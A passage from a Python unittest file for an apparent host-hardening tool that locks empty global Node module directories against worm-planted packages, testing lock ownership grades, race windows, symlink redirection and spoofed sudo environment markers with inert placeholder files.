        self.addCleanup(lambda: __import__("shutil").rmtree(fake, ignore_errors=True))
        with mock.patch.object(host_artifacts, "_global_folders", return_value=[fake]), \
             mock.patch.object(hostdenial, "holds", return_value=False), \
             mock.patch.object(host_artifacts, "_host_user_tag", return_value=None), \
             mock.patch.object(host_artifacts, "_sideloaded_python_dir", lambda *_a, **_k: None), \
             mock.patch.object(host_artifacts, "_staged_secret_scanner", lambda *_a, **_k: None), \
             mock.patch.object(host_artifacts, "_distinct_dirs", lambda paths: []):
            strong, weak, unread, _controlled = host_artifacts._host_artifacts()
        self.assertTrue(any(str(fake) in item[0] for item in weak), weak)
        self.assertEqual(strong, [])
        self.assertEqual(unread, [])


class TestAControlDoesNotMakeTheHostReadSafer(unittest.TestCase):
    """Applying the control removes the location it covers from the audit's evidence. A host whose
    remaining location still carries a tree must not come out of the rotation gate because of it."""

    def _grade(self, locations, holding):
        from stayawake.bots.security.hygiene import host_artifacts
        with mock.patch.object(host_artifacts, "_global_folders", return_value=locations), \
             mock.patch.object(hostdenial, "held_by",
                               lambda p: hostdenial.ROOT_HELD if p in holding else None), \
             mock.patch.object(host_artifacts, "_host_user_tag", return_value=None), \
             mock.patch.object(host_artifacts, "_sideloaded_python_dir", lambda *_a, **_k: None), \
             mock.patch.object(host_artifacts, "_staged_secret_scanner", lambda *_a, **_k: None), \
             mock.patch.object(host_artifacts, "_distinct_dirs", lambda paths: []):
            return host_artifacts.check_host_artifacts()

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="control-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))
        # Both carry a real tree. An empty directory is not evidence of one, so a fixture built
        # from empty directories tests nothing about what covering a location does.
        self.covered = self.d / "covered"
        (self.covered / "pkg").mkdir(parents=True)
        self.left = self.d / "left"
        (self.left / "pkg").mkdir(parents=True)

    def test_rotation_stays_unsafe_when_a_location_was_left_as_it_stood(self):
        from stayawake.bots.security.hygiene.models import ROTATION_UNSAFE_IDS, rotation_safety
        before = {i.id for i in self._grade([self.covered, self.left], holding=set())}
        self.assertTrue(before & ROTATION_UNSAFE_IDS, before)
        after = self._grade([self.covered, self.left], holding={self.covered})
        ids = {i.id for i in after}
        self.assertTrue(ids & ROTATION_UNSAFE_IDS, ids)
        self.assertNotEqual(rotation_safety(ids), "safe")
        self.assertEqual([i.severity for i in after], ["warning"])
        self.assertNotIn(str(self.left), after[0].detail)
        self.assertIn("not rotate", after[0].remediation.lower())

    def test_a_fully_controlled_host_reports_nothing(self):
        self.assertEqual(self._grade([self.covered], holding={self.covered}), [])


class TestTheTwoGradesAreNeverConflated(unittest.TestCase):
    """A lock the operator holds is a weaker control than one root holds — MEASURED, its owner
    clears the flag with one call and no privilege. Reporting them alike would hand someone an
    assurance that code running as them can undo."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-grade-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def _dir(self, name: str) -> Path:
        target = self.d / name
        target.mkdir()
        return target

    def test_a_lock_this_account_owns_reads_back_as_self_held(self):
        target = self._dir("mine")
        with locked(target):
            self.assertEqual(hostdenial.held_by(target), hostdenial.SELF_HELD)

    def test_the_strict_reading_still_answers_only_for_root(self):
        """`holds` is what the host-artifact probe asks. A location the operator can reopen is
        not one it may call controlled."""
        target = self._dir("mine")
        with locked(target):
            self.assertFalse(hostdenial.holds(target))

    def test_an_unlocked_directory_is_held_by_nobody(self):
        target = self.d / "open"
        target.mkdir()
        self.assertIsNone(hostdenial.held_by(target))

    def test_a_directory_with_something_in_it_is_held_by_nobody(self):
        target = self.d / "full"
        target.mkdir()
        (target / "payload.js").write_text("x")
        with locked(target):
            self.assertIsNone(hostdenial.held_by(target))

    def test_applying_without_privilege_reports_the_weaker_grade(self):
        target = self.d / "fresh"
        with locked(), mock.patch.object(hostdenial, "privileged", return_value=False):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.SELF_ENFORCING)
        self.assertIn("running as you can remove it", out.detail)


class TestWhereItCannotWriteWithoutRoot(unittest.TestCase):
    def test_a_location_this_account_cannot_write_to_is_named_not_guessed(self):
        """A directory that IS here but is not ours — the `/usr/lib` case. A directory that is not
        here at all is a different answer, and gets one."""
        here = Path(tempfile.mkdtemp(prefix="harden-noperm-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(here, ignore_errors=True))
        with mock.patch.object(hostdenial, "privileged", return_value=False), \
             mock.patch.object(hostdenial, "held_by", return_value=None), \
             mock.patch.object(denial, "_create_where_it_was_named", return_value=False), \
             mock.patch.object(hostdenial, "can_write_into", return_value=False):
            out = denial.apply_one(here / "node")
        self.assertEqual(out.state, denial.NEEDS_ROOT)
        self.assertIn("sudo", out.detail)

    def test_a_writable_location_is_not_reported_as_needing_root(self):
        self.assertTrue(hostdenial.can_write_into(Path.home() / ".node_modules_probe"))


class TestItCreatesTheLeafNotTheTree(unittest.TestCase):
    """A control creates the location it was aimed at, never the directories above it. Building
    the tree meant a location named for a package manager the host does not have got that
    manager's prefix built for it."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-leaf-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def test_a_location_whose_directory_is_absent_is_not_created(self):
        out = denial.apply_one(self.d / "no-such-prefix" / "lib" / "node")
        self.assertEqual(out.state, denial.NOT_HERE_YET)
        self.assertFalse((self.d / "no-such-prefix").exists(), "and no tree was built for it")

    def test_a_location_whose_directory_is_here_is_taken(self):
        (self.d / "lib").mkdir()
        with locked():
            self.assertEqual(denial.apply_one(self.d / "lib" / "node").state,
                             denial.SELF_ENFORCING)

    def test_the_probe_is_still_told_about_every_location(self):
        """The list answers where the runtime resolves; what may be created is the control's
        decision. Filtering absent locations out of the list starved the probe of the platform's
        own entries, which it enumerates for coverage."""
        with mock.patch.dict(os.environ, {"PREFIX": "/opt/declared-but-absent"}):
            targets = [str(p) for p in host_artifacts._global_folders()]
        self.assertIn("/opt/declared-but-absent/lib/node", targets)


class TestALiveInstallIsLeftRemovable(unittest.TestCase):
    """`<prefix>/lib/node` is a real resolution path and also a directory inside the install. A
    version manager removes a version with `rm -rf <prefix>`, which an immutable child defeats."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-nvm-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def test_a_prefix_holding_a_node_binary_is_not_locked(self):
        prefix = self.d / "versions" / "node" / "v22.11.0"
        (prefix / "bin").mkdir(parents=True)
        (prefix / "lib").mkdir()
        (prefix / "bin" / "node").write_text("#!/bin/sh\n")

        out = denial.apply_one(prefix / "lib" / "node")

        self.assertEqual(out.state, denial.IN_A_LIVE_INSTALL)
        self.assertFalse((prefix / "lib" / "node").exists(), "nothing was created")

    def test_the_version_can_still_be_removed_afterwards(self):
        prefix = self.d / "v1"
        (prefix / "bin").mkdir(parents=True)
        (prefix / "lib").mkdir()
        (prefix / "bin" / "node").write_text("#!/bin/sh\n")
        denial.apply_one(prefix / "lib" / "node")

        __import__("shutil").rmtree(prefix)

        self.assertFalse(prefix.exists())

    def test_a_prefix_with_no_node_in_it_is_still_taken(self):
        prefix = self.d / "bare"
        (prefix / "lib").mkdir(parents=True)
        with locked():
            self.assertEqual(denial.apply_one(prefix / "lib" / "node").state,
                             denial.SELF_ENFORCING)


class TestTheReadBackDoesNotTrustPath(unittest.TestCase):
    """What decides whether a control is reported as in place must not come from `PATH`. This
    command now runs unprivileged by design, so `PATH` belongs to whoever ran it — and a program
    earlier in it that prints a flags field containing `i` would make an unlocked directory read
    back as locked."""

    def test_the_tools_are_looked_for_at_absolute_paths_only(self):
        for name, candidates in hostdenial._ATTR_TOOL_ABSOLUTE_PATHS.items():
            with self.subTest(tool=name):
                self.assertTrue(candidates, f"{name} must have somewhere to be found")
                for candidate in candidates:
                    self.assertTrue(candidate.startswith("/"),
                                    f"{candidate} would be resolved through PATH")

    def test_a_tool_that_is_not_there_is_never_looked_for_on_path(self):
        """Asserting only the return value cannot see this: on a host without the tool, a bare
        name fails too, so both answer False and the mutation hides. What has to hold is that
        nothing is executed at all — that is what keeps `PATH` out of the decision.

        The fixture has to EXIST: the write paths check it first, so a made-up one bails before it
        would look for a tool and the assertions pass without testing anything."""
        target = Path(tempfile.mkdtemp(prefix="harden-notool-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(target, ignore_errors=True))
        with mock.patch.object(hostdenial, "_attr_tool", return_value=None), \
             mock.patch.object(hostdenial.sys, "platform", "linux"), \
             mock.patch.object(hostdenial.subprocess, "run") as ran:
            self.assertFalse(hostdenial.immutable(target))
            self.assertFalse(hostdenial.set_immutable(target))
            self.assertFalse(hostdenial.clear_immutable(target))
        ran.assert_not_called()

    def test_the_source_names_no_bare_tool(self):
        """A regression here would be one word, and it would be invisible in a diff review."""
        source = Path(hostdenial.__file__).read_text(encoding="utf-8")
        for bare in ('["lsattr"', '["chattr"', "'lsattr'", "'chattr'"):
            self.assertNotIn(bare, source)


class TestNothingIsSealedInDuringTheUpgrade(unittest.TestCase):
    """The owner cannot be changed while the flag is set, so raising a control briefly opens the
    location. Anything that arrives in that gap must not be locked in — that would put content at
    the exact location this exists to keep empty, out of the operator's reach."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-window-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def _upgrade_raced(self, target: Path):
        """Run the privileged upgrade with something writing into the window it opens.

        `chown` is a no-op rather than the hook: a mock that also moved modes would satisfy the
        assertions below by itself.
        """
        held = {target.resolve()}

        def unlocks_and_loses_the_race(p):
            held.discard(Path(p).resolve())
            os.chmod(p, 0o755)
            (Path(p) / "payload.js").write_text("x")
            os.chmod(p, 0o555)
            return True

        with mock.patch.object(hostdenial, "immutable",
                               lambda p: Path(p).resolve() in held), \
             mock.patch.object(hostdenial, "clear_immutable", unlocks_and_loses_the_race), \
             mock.patch.object(hostdenial, "set_immutable",
                               lambda p: bool(held.add(Path(p).resolve()) or True)), \
             mock.patch.object(os, "geteuid", lambda: 0), \
             mock.patch.dict(os.environ, {"SUDO_UID": str(os.getuid())}), \
             mock.patch.object(denial.os, "chown", lambda *a, **k: None):
            return denial.apply_one(target), held

    def _control(self, name: str = "held") -> Path:
        target = self.d / name
        target.mkdir()
        os.chmod(target, 0o555)
        return target

    def test_content_arriving_in_the_gap_is_not_locked_in(self):
        target = self._control()
        out, held = self._upgrade_raced(target)
        self.assertEqual(out.state, denial.LEFT_OPEN_OVER_CONTENT)
        self.assertNotIn(target.resolve(), held, "it must not end up locked around that content")

    def test_the_gap_is_never_reported_as_a_location_that_was_not_changed(self):
        out, _ = self._upgrade_raced(self._control())
        self.assertNotEqual(out.state, denial.OCCUPIED)
        self.assertNotIn("not changed", out.detail)
        self.assertIn("arrived while the lock was off", out.detail)

    def test_the_location_is_handed_back_so_the_operator_can_clear_it(self):
        target = self._control()
        self._upgrade_raced(target)
        self.assertEqual(target.stat().st_mode & 0o777, 0o700)
        self.assertTrue(os.access(target, os.W_OK | os.X_OK),
                        "the operator must be able to remove what arrived")

    def test_the_run_says_so_and_does_not_pass(self):
        out, _ = self._upgrade_raced(self._control())
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, live=lambda: [],
                                folders=lambda: [out.path], apply=lambda p: out, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)
        self.assertIn("should not be", text)
        self.assertIn("should not be", text)

    def test_every_note_that_applies_is_printed(self):
        left_open = denial.PathOutcome(Path("/open"), denial.LEFT_OPEN_OVER_CONTENT, "x")
        needs_root = denial.PathOutcome(Path("/theirs"), denial.NEEDS_ROOT, "y")
        _, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, live=lambda: [],
                             folders=lambda: [Path("/open"), Path("/theirs")],
                             apply=lambda p: left_open if p == Path("/open") else needs_root, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertIn("should not be", text)
        self.assertIn("Run again with sudo", text)


class TestTakingAControlBack(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-back-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def _dir(self, name: str) -> Path:
        target = self.d / name
        target.mkdir()
        return target

    def test_a_control_this_tool_placed_is_removed(self):
        target = self._dir("denied")
        with locked(target):
            out = denial.remove_one(target)
        self.assertEqual(out.state, denial.REMOVED)
        self.assertFalse(target.exists())

    def test_a_locked_directory_holding_content_is_never_opened(self):
        """The danger in this verb is the obvious implementation: one that unlocks whatever it is
        pointed at is a way to open a location on request, wearing a helpful name."""
        target = self._dir("theirs")
        (target / "keep.txt").write_text("x")
        with locked(target) as held:
            out = denial.remove_one(target)
            self.assertIn(target.resolve(), held, "it is never even unlocked")
        self.assertEqual(out.state, denial.LOCKED_OVER_CONTENT)
        self.assertTrue((target / "keep.txt").exists())

    def test_a_location_locked_over_content_is_not_a_settled_run(self):
        target = self._dir("hostile")
        (target / "evil.js").write_text("x")
        with locked(target):
            code, text = harden.take_back(restore_editors=_EDITORS_BACK, supported=lambda: True, folders=lambda: [target], unschedule=lambda: 'nothing-to-remove')
        self.assertNotEqual(code, 0)
        self.assertIn("locked-over-content", text)

    def test_content_arriving_while_the_lock_is_off_is_left_reachable(self):
        target = self._dir("racy")
        with locked(target) as held:
            def arrives(p):
                held.discard(Path(p).resolve())
                (Path(p) / "late.txt").write_text("x")
                return True
            with mock.patch.object(hostdenial, "clear_immutable", arrives):
                out = denial.remove_one(target)
            self.assertNotIn(target.resolve(), held, "it must NOT be locked around that content")
        self.assertEqual(out.state, denial.LEFT_OPEN_OVER_CONTENT)
        self.assertTrue((target / "late.txt").exists())

    def test_a_location_left_open_over_content_is_not_a_settled_run(self):
        target = self._dir("racy")
        with locked(target) as held:
            def arrives(p):
                held.discard(Path(p).resolve())
                (Path(p) / "late.txt").write_text("x")
                return True
            with mock.patch.object(hostdenial, "clear_immutable", arrives):
                code, text = harden.take_back(restore_editors=_EDITORS_BACK, supported=lambda: True, folders=lambda: [target], unschedule=lambda: 'nothing-to-remove')
        self.assertNotEqual(code, 0)
        self.assertIn("should not be", text)
        self.assertIn("should not be", text)

    def test_a_link_on_the_way_redirects_nothing(self):
        """Creating through a planted link puts a control somewhere unintended. Removing through
        one unlocks and deletes somewhere unintended, and this side had no check at all."""
        elsewhere = self.d / "elsewhere"
        (elsewhere / "node").mkdir(parents=True)
        prefix = self.d / "prefix"
        prefix.mkdir()
        (prefix / "lib").symlink_to(elsewhere)

        with locked(prefix / "lib" / "node"):
            out = denial.remove_one(prefix / "lib" / "node")

        self.assertEqual(out.state, denial.NOT_WHERE_IT_WAS_NAMED)
        self.assertTrue((elsewhere / "node").exists(), "the real directory is untouched")

    def test_a_location_holding_nothing_of_ours_is_not_touched(self):
        target = self.d / "plain"
        target.mkdir()
        out = denial.remove_one(target)
        self.assertEqual(out.state, denial.NOTHING_TO_REMOVE)
        self.assertTrue(target.exists())

    def test_one_root_holds_needs_privilege_to_take_back(self):
        target = self.d / "roots"
        target.mkdir()
        with mock.patch.object(hostdenial, "held_by", return_value=hostdenial.ROOT_HELD), \
             mock.patch.object(hostdenial, "privileged", return_value=False):
            out = denial.remove_one(target)
        self.assertEqual(out.state, denial.NEEDS_ROOT)
        self.assertTrue(target.exists())

    def test_a_removal_that_did_not_happen_is_never_reported_as_done(self):
        target = self._dir("stubborn")
        with locked(target), mock.patch.object(denial.os, "rmdir", lambda p: None):
            out = denial.remove_one(target)
        self.assertEqual(out.state, denial.UNKNOWN)

    def test_taking_back_does_not_wait_for_capture(self):
        """Applying a control waits for a live process to be captured, because a denied write
        kills it. This opens a location rather than closing one."""
        removed = []
        code, text = harden.take_back(restore_editors=_EDITORS_BACK, 
            supported=lambda: True, folders=lambda: [Path("/x")],
            remove=lambda p: removed.append(p) or denial.PathOutcome(p, denial.REMOVED, "gone"), unschedule=lambda: 'nothing-to-remove')
        self.assertEqual(code, 0)
        self.assertTrue(removed)


class TestEveryWayPrivilegeIsRaised(unittest.TestCase):
    """Recognising only `sudo` fixed the grading for one tool and left the same defect under the
    next: the effective uid is root under all of them."""

    def _as_root(self, env):
        with mock.patch.object(os, "geteuid", lambda: 0):
            return operator.resolve(env)

    def test_each_escalation_resolves_to_the_invoker(self):
        me = pwd.getpwuid(os.getuid())
        for var, value in (("SUDO_UID", str(me.pw_uid)), ("SUDO_USER", me.pw_name),
                           ("DOAS_USER", me.pw_name), ("PKEXEC_UID", str(me.pw_uid))):
            with self.subTest(var=var):
                who = self._as_root({"HOME": "/var/root", var: value})
                self.assertIsNotNone(who, f"{var} names the invoker")
                self.assertEqual(who.uid, me.pw_uid)

    def test_root_with_no_marker_is_refused_not_guessed(self):
        """Answering this from `HOME` is what produced the defect in the first place."""
        self.assertIsNone(self._as_root({"HOME": "/var/root"}))

    def test_an_account_that_does_not_resolve_is_refused(self):
        self.assertIsNone(self._as_root({"HOME": "/var/root", "SUDO_USER": "no-such-account"}))

    def test_without_escalation_the_environment_answers(self):
        with mock.patch.object(os, "geteuid", lambda: os.getuid()):
            who = operator.resolve({"HOME": "/Users/x", "USER": "x"})
        self.assertEqual(who.home, Path("/Users/x"))


class TestAPlantedEscalationMarkerDecidesNothing(unittest.TestCase):
    """An escalation marker is an ordinary environment variable any unprivileged process can
    export. Reading its presence as proof that privilege was raised let one line in a shell rc —
    the surface this worm family writes to — pick the account every location is graded against."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-operator-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))
        self.me = pwd.getpwuid(os.getuid())

    def test_a_marker_on_a_process_that_is_not_root_names_nobody(self):
        with mock.patch.dict(os.environ, {"SUDO_UID": "0"}):
            self.assertEqual(operator.acting_uid(), os.geteuid())
            self.assertNotEqual(operator.resolve().uid, 0)

    def test_a_control_that_is_in_place_stays_visible(self):
        target = self.d / "denied"
        target.mkdir()
        with locked(target):
            self.assertEqual(hostdenial.held_by(target), hostdenial.SELF_HELD)
            with mock.patch.dict(os.environ, {"SUDO_UID": "0"}):
                self.assertEqual(hostdenial.held_by(target), hostdenial.SELF_HELD)

    def test_running_as_another_account_grades_against_that_account(self):
        with mock.patch.dict(os.environ, {"SUDO_UID": "1", "SUDO_USER": "daemon"}):
            self.assertEqual(operator.acting_uid(), os.geteuid())

    def test_markers_that_disagree_are_refused(self):
        with mock.patch.object(os, "geteuid", lambda: 0):
            self.assertIsNone(operator.resolve({"HOME": "/var/root", "SUDO_UID": "0",
                                                "SUDO_USER": self.me.pw_name}))

    def test_markers_that_agree_still_name_the_invoker(self):
        with mock.patch.object(os, "geteuid", lambda: 0):
            who = operator.resolve({"HOME": "/var/root", "SUDO_UID": str(self.me.pw_uid),
                                    "SUDO_USER": self.me.pw_name})
        self.assertEqual(who.uid, self.me.pw_uid)


class TestTheFlagNeverGoesBackOverContent(unittest.TestCase):
    """One rule with three exits, written at one of them. Two of the three put the flag back
    without asking whether the location was still empty, and both reported a reason that says
    nothing about content — so a run that lost the race AND failed sealed the arrival in and
    called it "could not be raised to root"."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-relock-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def _raised_upgrade(self, target, *, chown=None, on_set=None):
        held = {target.resolve()}

        def sets(p):
            if on_set is not None:
                on_set(Path(p))
            held.add(Path(p).resolve())
            return True

        with mock.patch.object(hostdenial, "immutable",
                               lambda p: Path(p).resolve() in held), \
             mock.patch.object(hostdenial, "clear_immutable",
                               lambda p: held.discard(Path(p).resolve()) or True), \
             mock.patch.object(hostdenial, "set_immutable", sets), \
             mock.patch.object(os, "geteuid", lambda: 0), \
             mock.patch.dict(os.environ, {"SUDO_UID": str(os.getuid())}), \
             mock.patch.object(denial.os, "chown", chown or (lambda *a, **k: None)):
            return denial.apply_one(target), held

    def _control(self, name="held"):
        target = self.d / name
        target.mkdir()
        os.chmod(target, 0o555)
        return target

    def test_a_failed_raise_over_an_arrival_does_not_seal_it_in(self):
        target = self._control()

        def arrives_then_fails(path, *_a, **_k):
            os.chmod(path, 0o755)
            (Path(path) / "payload.js").write_text("x")
            os.chmod(path, 0o555)
            raise PermissionError("chown refused")

        out, held = self._raised_upgrade(target, chown=arrives_then_fails)
        self.assertEqual(out.state, denial.LEFT_OPEN_OVER_CONTENT)
        self.assertNotIn(target.resolve(), held, "it must not end up locked around that content")
        self.assertIn("NOT put back", out.detail)

    def test_a_failed_raise_over_an_empty_location_still_puts_the_flag_back(self):
        target = self._control()

        def fails(path, *_a, **_k):
            raise PermissionError("chown refused")

        out, held = self._raised_upgrade(target, chown=fails)
        self.assertEqual(out.state, denial.UNKNOWN)
        self.assertIn("could not be raised", out.detail)
        self.assertIn(target.resolve(), held, "an empty location keeps its lock")

    def test_an_arrival_after_the_check_is_unlocked_again(self):
        target = self._control()

        def lands(p):
            os.chmod(p, 0o755)
            (p / "late.js").write_text("x")
            os.chmod(p, 0o555)

        out, held = self._raised_upgrade(target, on_set=lands)
        self.assertEqual(out.state, denial.LEFT_OPEN_OVER_CONTENT)
        self.assertNotIn(target.resolve(), held, "it must not be left locked around that content")

    def test_what_it_says_about_the_owner_is_read_back(self):
        target = self._control()

        def arrives_then_fails(path, *_a, **_k):
            os.chmod(path, 0o755)
            (Path(path) / "payload.js").write_text("x")
            raise PermissionError("chown refused")

        out, _ = self._raised_upgrade(target, chown=arrives_then_fails)
        self.assertEqual(target.stat().st_uid, os.getuid())
        self.assertIn("you can read and remove", out.detail)
        self.assertNotIn("sudo", out.detail)


class TestALockUnderAThirdAccount(unittest.TestCase):
    """An immutable empty directory owned by neither root nor this account used to answer
    "nothing holds this" — over a directory that plainly does. The run then tried to write, got
    the EPERM the flag guarantees, and reported it as "could not be written"."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-third-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))
        self.target = self.d / "denied"
        self.target.mkdir()

    @contextlib.contextmanager
    def _only_the_global_folders(self):
        """Ask `_host_artifacts` about this fixture and nothing else.

        Its other probes read the real machine — one walks `$HOME` — at eight seconds a test.
        """
        with mock.patch.object(host_artifacts, "_global_folders", lambda: [self.target]), \
             mock.patch.object(host_artifacts, "_host_user_tag", lambda: None), \
             mock.patch.object(host_artifacts, "_sideloaded_python_dir", lambda unread: None), \
             mock.patch.object(host_artifacts, "_staged_secret_scanner",
                               lambda dirs, unread: None):
            yield

    @contextlib.contextmanager
    def _under_another_account(self):
        """Graded against a uid that is not the directory's owner — which is also what a wrong
        operator resolution produces, and there the lock is really the operator's own."""
        with locked(self.target), \
             mock.patch.object(operator, "acting_uid", lambda env=None: os.getuid() + 1000):
            yield

    def test_it_is_a_lock_not_an_absence(self):
        with self._under_another_account():
            self.assertEqual(hostdenial.held_by(self.target), hostdenial.OTHER_HELD)

    def test_applying_names_it_instead_of_failing_to_write(self):
        with self._under_another_account(), \
             mock.patch.object(denial.os, "chmod") as chmod:
            out = denial.apply_one(self.target)
        chmod.assert_not_called()
        self.assertEqual(out.state, denial.HELD_BY_ANOTHER)
        self.assertIn("another account", out.detail)

    def test_the_run_does_not_claim_the_control_is_in_place(self):
        out = denial.PathOutcome(Path("/x"), denial.HELD_BY_ANOTHER, "another account's")
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, live=lambda: [],
                                folders=lambda: [Path("/x")], apply=lambda p: out, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)
        self.assertIn("not fully protected", text)

    def test_taking_back_refuses_it(self):
        with self._under_another_account():
            out = denial.remove_one(self.target)
            self.assertEqual(hostdenial.held_by(self.target), hostdenial.OTHER_HELD,
                             "it is never even unlocked")
        self.assertEqual(out.state, denial.HELD_BY_ANOTHER)
        self.assertTrue(self.target.exists())

    def test_it_is_not_a_settled_take_back(self):
        out = denial.PathOutcome(Path("/x"), denial.HELD_BY_ANOTHER, "another account's")
        code, _ = harden.take_back(restore_editors=_EDITORS_BACK, supported=lambda: True, folders=lambda: [Path("/x")],
                                   remove=lambda p: out, unschedule=lambda: 'nothing-to-remove')
        self.assertNotEqual(code, 0)

    def test_the_audit_does_not_credit_it_as_this_tools_own_work(self):
        with self._under_another_account(), self._only_the_global_folders():
            _strong, weak, _unread, controlled = host_artifacts._host_artifacts()
        self.assertNotIn(self.target, controlled, "it is not this tool's own work")
        self.assertIn(self.target, [path for _d, path, _k in weak],
                      "so it keeps the grade it had before this state existed")

    def test_a_lock_this_tool_does_hold_is_still_credited(self):
        with locked(self.target), self._only_the_global_folders():
            _strong, weak, _unread, controlled = host_artifacts._host_artifacts()
        self.assertIn(self.target, controlled)
        self.assertNotIn(self.target, [path for _d, path, _k in weak])


class TestAMarkerThatIsNotANumber(unittest.TestCase):
    def test_a_digit_int_refuses_does_not_escape_as_an_exception(self):
        with mock.patch.object(os, "geteuid", lambda: 0):
            self.assertIsNone(operator.resolve({"HOME": "/var/root", "SUDO_UID": "\u00b2"}))

    def test_a_marker_that_is_not_a_number_never_names_an_account(self):
        with mock.patch.object(os, "geteuid", lambda: 0):
            self.assertIsNone(operator.resolve({"HOME": "/var/root", "SUDO_UID": "root"}))


class TestTheFlagIsOnlyEverSetOverNothing(unittest.TestCase):
    """One rule, and the round before this found it written at one of three exits. It is one
    function now, and the answer comes from a read-back AFTER the write — asking `empty_dir` and
    then setting the flag is two syscalls with the gap the whole problem lives in between them."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-seal-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def _held(self, target):
        return {target.resolve()}

    def test_an_arrival_between_the_check_and_the_write_is_not_sealed_in(self):
        target = self.d / "racy"
        target.mkdir()
        held = self._held(target)
        landed = []

        def sets_and_loses_the_race(p):
            held.add(Path(p).resolve())
            if not landed:
                landed.append(None)
                (Path(p) / "payload.js").write_text("x")
            return True

        with mock.patch.object(hostdenial, "immutable",
                               lambda p: Path(p).resolve() in held), \
             mock.patch.object(hostdenial, "clear_immutable",
                               lambda p: held.discard(Path(p).resolve()) or True), \
             mock.patch.object(hostdenial, "set_immutable", sets_and_loses_the_race):
            self.assertFalse(denial._sealed_over_nothing(target))
        self.assertNotIn(target.resolve(), held, "the flag comes straight off again")

    def test_taking_back_does_not_seal_in_when_the_removal_fails(self):
        """The arrival has to land between the emptiness check and the `rmdir` to reach that exit.
        Planting it at the unlock returns at an earlier branch and leaves this code untouched,
        which is how the first version of this test passed against the defect."""
        target = self.d / "stubborn"
        target.mkdir()
        held = self._held(target)

        def arrives_then_refuses(p):
            (Path(p) / "payload.js").write_text("x")
            raise OSError("not empty")

        with mock.patch.object(hostdenial, "immutable",
                               lambda p: Path(p).resolve() in held), \
             mock.patch.object(hostdenial, "clear_immutable",
                               lambda p: held.discard(Path(p).resolve()) or True), \
             mock.patch.object(hostdenial, "set_immutable",
                               lambda p: bool(held.add(Path(p).resolve()) or True)), \
             mock.patch.object(denial.os, "rmdir", arrives_then_refuses):
            out = denial.remove_one(target)
        self.assertNotIn(target.resolve(), held, "it must not be locked around that content")
        self.assertEqual(out.state, denial.LEFT_OPEN_OVER_CONTENT)
        self.assertTrue((target / "payload.js").exists())

    def test_a_flag_that_will_not_come_off_is_said_so_not_said_open(self):
        target = self.d / "stuck"
        target.mkdir()
        (target / "payload.js").write_text("x")
        with mock.patch.object(hostdenial, "immutable", return_value=True), \
             mock.patch.object(hostdenial, "clear_immutable", return_value=False):
            out = denial._hand_back(target, os.getuid())
        self.assertEqual(out.state, denial.LOCKED_OVER_CONTENT)
        self.assertNotIn("NOT put back", out.detail)


class TestALockUnderAThirdAccountAtRoot(unittest.TestCase):
    """`chflags(2)`: the flag may be set or unset by the owner OR the super-user. Refusing while
    privileged asserted a limit that was never read, and made the raise-to-root path unreachable
    for every lock not owned by the account this happened to resolve."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-third-root-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))
        self.target = self.d / "denied"
        self.target.mkdir()

    @contextlib.contextmanager
    def _third_account(self, *, privileged):
        with locked(self.target), \
             mock.patch.object(operator, "acting_uid", lambda env=None: os.getuid() + 1000), \
             mock.patch.object(hostdenial, "privileged", return_value=privileged):
            yield

    def test_unprivileged_it_names_the_way_forward(self):
        with self._third_account(privileged=False):
            out = denial.apply_one(self.target)
        self.assertEqual(out.state, denial.HELD_BY_ANOTHER)
        self.assertIn("sudo", out.detail, "every other refusal says how to get past it")

    def test_as_root_it_takes_it_over_rather_than_refusing(self):
        with self._third_account(privileged=True), \
             mock.patch.object(denial.os, "chown", lambda *a, **k: None), \
             mock.patch.object(hostdenial, "holds", return_value=True):
            out = denial.apply_one(self.target)
        self.assertEqual(out.state, denial.ENFORCING)

    def test_taking_back_still_refuses_it_and_says_why_truthfully(self):
        with self._third_account(privileged=True):
            out = denial.remove_one(self.target)
        self.assertEqual(out.state, denial.HELD_BY_ANOTHER)
        self.assertIn("only what it placed", out.detail)
        self.assertNotIn("cannot", out.detail.lower())

class TestTheReportIsReadable(unittest.TestCase):
    """An engineer ran this and could not act on any of it: nine lines, six paths, each with its
    own explanation, under a headline saying the control was not in place when four of the six
    locations were protected."""

    def _run(self, states):
        outs = [denial.PathOutcome(Path(f"/p{n}"), state, "detail") for n, state in enumerate(states)]
        seq = iter(outs)
